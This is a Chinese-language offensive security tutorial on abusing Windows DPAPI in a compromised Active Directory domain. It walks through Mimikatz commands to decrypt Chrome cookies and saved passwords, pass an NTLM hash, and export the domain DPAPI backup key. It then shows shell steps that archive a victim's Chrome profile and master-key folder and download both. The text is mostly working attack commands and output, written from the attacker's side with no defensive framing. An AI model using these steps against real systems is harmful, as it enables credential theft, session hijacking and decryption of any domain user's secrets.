### 优化后的文本

#### DPAPI (Data Protection Application Programming Interface) 概述
DPAPI 是 Windows 系统中用于保护加密数据的一个接口，广泛应用于用户数据的存储。在 Windows 环境下，用户的加密数据大多通过 DPAPI 进行存储。为了访问这些加密数据，攻击者需要获取相应的 MasterKey。

在渗透测试或红队攻击中，明确目标至关重要。有时仅获得域管理员权限并不足以达到目的，因为攻击目标可能被定义为特定网段或个人电脑中的敏感信息。本文将讨论 DPAPI 密钥在这些场景中的作用及其重要性。

读取 DPAPI 密钥使攻击者能够“横向”维持在云服务层级，无需持续访问受害者的主机。这为攻击者提供了从敏感服务（如 Office 365 电子邮件、共享文档和团队聊天服务）获取信息的新途径。

本文重点介绍几种 DPAPI 密钥（包括域控的 DPAPI 备份密钥）的读取技术。一旦获得域管理员权限，攻击者通常可以访问域内任何用户的秘密，无论是通过受害者的主机还是通过域控。

#### 攻击场景定义
- 在目标域环境中已有控制的主机。
- 可以访问域管理员凭据或哈希值（或其中之一）。
- 目标是访问存储在谷歌浏览器中的特定用户的凭据，包括历史记录和 Cookie。

基于以上情况，我们将探讨两种主要的攻击场景：
1. **控制受害者主机并执行 Mimikatz**：这是较为常见的方法。
2. **利用域备份密钥**：这种方法提供了一种无需上传 Mimikatz 的替代方案。

### 常用方法：从系统中读取 Cookie 和机密
假设已通过网络钓鱼或其他方式入侵了目标主机，我们的目标是获取主密钥以访问谷歌浏览器存储的凭据和 Cookie。为此，可以在受害者主机上以当前用户权限执行以下 Mimikatz 命令：

```bash
dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Cookies" /unprotect
```

同样地，可以使用类似命令来获取保存的谷歌浏览器凭据：

```bash
dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
```

通过这两个 Mimikatz 命令，即使是在受密码保护的用户主机上也可以解密其主密钥。然而，这种攻击有局限性，因为需要将 Mimikatz 上传到目标计算机。如果目标机器上有防病毒软件或 EDR，还需要规避这些防御措施。

关于这种方法的重要结论：
- Mimikatz 需要与 psexec 协同工作，但仍然需要先将 Mimikatz 上传到目标主机。
- 使用 psexec 执行 Mimikatz 时，无法提取谷歌浏览器的 Cookie 和凭据，因为 Mimikatz 需要在 SYSTEM 权限下运行。
- 解决方法是使用 `sekurlsa::dpapi` 从内存中读取主密钥。

例如，假设我们想要解密用户 `CORE\kbell` 的密钥，其主密钥为 `9a6f199e3d2e698ce78fdeeefadc85c527c43b4e3c5518c54e95718842829b12912567ca0713c4bd0cf74743c81c1d32bbf10020c9d72d58c99e731814e4155b`，则可以执行以下命令：

```bash
dpapi::chrome /in:"C:\Users\kbell\AppData\Local\Google\Chrome\User Data\Default\Cookies" /masterkey:9a6f199e3d2e698ce78fdeeefadc85c527c43b4e3c5518c54e95718842829b12912567ca0713c4bd0cf74743c81c1d32bbf10020c9d72d58c99e731814e4155b
```

### 另辟蹊径：Mimikatz 和域控制器
除了上传 Mimikatz 到目标主机的方法外，还有一种无需上传 Mimikatz 即可实现相同功能的方法。为此，我们需要一台已控制的 Windows 主机，并且该主机能够访问域控。

#### 以普通域用户权限打开 cmd.exe
在已控制的主机上以普通域用户权限运行 Mimikatz 是可行的。首先，我们需要在域主机中打开一个 cmd.exe。例如，用户为 `core.internal\administrator`：

```bash
runas /netonly /u:"core.internal\administrator" cmd.exe
```

如果无法获取明文密码，可以使用 NTLM 哈希值。例如，如果拥有域管理员用户的 NTLM 哈希值，则可以使用 Mimikatz 的传递哈希功能：

```bash
sekurlsa::pth /user:DA_ADMIN_USER /domain:FQDN.DOMAIN.LOCAL /ntlm:USER_NTLM_HASH
```

#### 转储备份密钥
从域控导出备份密钥是另一种方法。简要解释一下备份密钥的概念：操作系统的多个组件使用 DPAPI 来安全地存储密码、加密密钥或任何敏感数据。在域环境中，用户主密钥的副本使用 DPAPI 域备份密钥进行加密，这种备份密钥是所有域控共享的。

这意味着使用 DPAPI 域备份密钥可以访问任何域用户的主密钥，从而解密存储在域中任何用户的密文。要使用 Mimikatz 获取备份密钥，请执行以下命令：

```bash
lsadump::backupkeys /system:DOMAIN-CONTROLLER-HOSTNAME /export
```

例如，使用 `dc01.core.internal` 作为域控制器：

```bash
lsadump::backupkeys /system:dc01.core.internal /export
```

#### 在谷歌浏览器中窃取域用户的会话
假设我们入侵了一个名为 `core.internal\kbell` 的用户主机，并且这台主机是公司的 IT 主管所用。由于需要压缩一些文件，因此需要上传一个可移植版本的 `7zip`。

首先，使用 `wmiexec.py` 或其他方式获得一个 shell，然后上传 `7za.exe` 文件：

```bash
C:\users\kbell\desktop>put /home/rifle/Tools/windows-binaries/7za.exe .
[*] Uploading 7za.exe to C:\users\kbell\desktop\.\7za.exe
C:\users\kbell\desktop>dir 7za.exe
 Volume in drive C has no label.
 Volume Serial Number is 36A0-B333
 Directory of C:\users\kbell\desktop
04/21/2020  09:17 PM         1,152,000 7za.exe
               1 File(s)      1,152,000 bytes
               0 Dir(s)   2,841,632,768 bytes free
```

接着，备份整个谷歌浏览器文件夹到一个 zip 文件中：

```bash
C:\users\kbell\desktop> 7za.exe a C:\Windows\Temp\google.zip "C:\Users\kbell\AppData\Local\Google\Chrome\User Data\"
7-Zip (a) 19.00 (x64) : Copyright (c) 1999-2018 Igor Pavlov : 2019-02-21
Scanning the drive:
583 folders, 1156 files, 163464925 bytes (156 MiB)
Creating archive: C:\Windows\Temp\google.zip
Add new data to archive: 583 folders, 1156 files, 163464925 bytes (156 MiB)
Files read from disk: 1156
Archive size: 69634627 bytes (67 MiB)
Everything is Ok
```

在此示例中，我们复制了整个文件夹，包括书签、历史记录等。特别感兴趣的是以下几个文件：

- `C:\Users\USERNAME\AppData\Local\Google\Chrome\User Data\Local State`
- `C:\Users\USERNAME\AppData\Local\Google\Chrome\User Data\Default\*`

现在可以下载这个包含了受害主机所有 Chrome 文件的 zip 文件：

```bash
C:\users\kbell\desktop>get C:\Windows\Temp\google.zip
[*] Downloading C:\\Windows\Temp\google.zip
```

接下来，我们需要 `%appdata%` 目录中的密钥，位于以下路径：

```bash
C:\Users\USERNAME\AppData\Roaming\Microsoft\Protect\SID
```

其中 `SID` 代表安全标识符，例如 `S-1-5-21-1968630676-249568448-1092335803-4255`。此文件夹中的所有文件都是隐藏的，需要使用 `dir /a` 列出它们。

备份此文件夹，稍后会用到：

```bash
C:\users\kbell\appdata\Roaming\Microsoft\Protect>dir /a
 Volume in drive C has no label.
 Volume Serial Number is 36A0-B333
 Directory of C:\users\kbell\appdata\Roaming\Microsoft\Protect
04/11/2020  06:14 PM              .
04/11/2020  06:14 PM              ..
04/11/2020  06:14 PM                24 CREDHIST
04/11/2020  06:14 PM              S-1-5-21-1968630676-249568448-1092335803-4255
04/11/2020  06:14 PM                76 SYNCHIST
               2 File(s)            100 bytes
               3 Dir(s)   2,840,129,536 bytes free
C:\users\kbell\appdata\Roaming\Microsoft\Protect>C:\Users\kbell\Desktop\7za.exe a C:\Windows\Temp\keys.zip S-1-5-21-1968630676-249568448-1092335803-4255\
7-Zip (a) 19.00 (x64) : Copyright (c) 1999-2018 Igor Pavlov : 2019-02-21
Scanning the drive:
1 folder, 3 files, 1676 bytes (2 KiB)
Creating archive: C:\Windows\Temp\keys.zip
Add new data to archive: 1 folder, 3 files, 1676 bytes (2 KiB)
Files read from disk: 3
Archive size: 2571 bytes (3 KiB)
Everything is Ok
```

最后，下载刚刚创建的 zip 文件。